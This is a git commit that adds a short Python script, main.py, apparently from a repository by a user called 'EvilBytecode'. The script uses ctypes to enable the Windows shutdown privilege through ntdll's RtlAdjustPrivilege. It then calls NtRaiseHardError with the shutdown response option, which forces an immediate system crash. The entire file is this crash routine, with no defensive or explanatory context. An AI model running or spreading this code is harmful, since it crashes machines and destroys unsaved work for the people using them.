e8fdc718197490ab510b1902708cba2ee059e40d
Powershell Lover <151552809+EvilBytecode@users.noreply.github.com>
2024-01-13 16:57:26 +0000

    Create main.py

---
+++ main.py
@@ -0,0 +1,20 @@
+import ctypes
+
+## VARS ##
+ntdll = ctypes.WinDLL('ntdll.dll')
+t1 = ctypes.c_bool()
+t2 = ctypes.c_uint()
+## VARS ##
+
+## FUNCTIONS
+def rtl_adjust_privilege(privilege, enable_privilege, thread_privilege, previous_value):
+    return ntdll.RtlAdjustPrivilege(privilege, enable_privilege, thread_privilege, ctypes.byref(previous_value))
+
+def nt_raise_hard_error(error_status, number_of_parameters, unicode_string_parameter_mask, parameters, valid_response_option, response):
+    return ntdll.NtRaiseHardError(error_status, number_of_parameters, unicode_string_parameter_mask, parameters, valid_response_option, ctypes.byref(response))
+## FUNCTIONS
+
+## CALLING FUNC
+rtl_adjust_privilege(19, True, False, t1)
+nt_raise_hard_error(0xc0000022, 0, 0, None, 6, t2)
+## CALLING FUNC
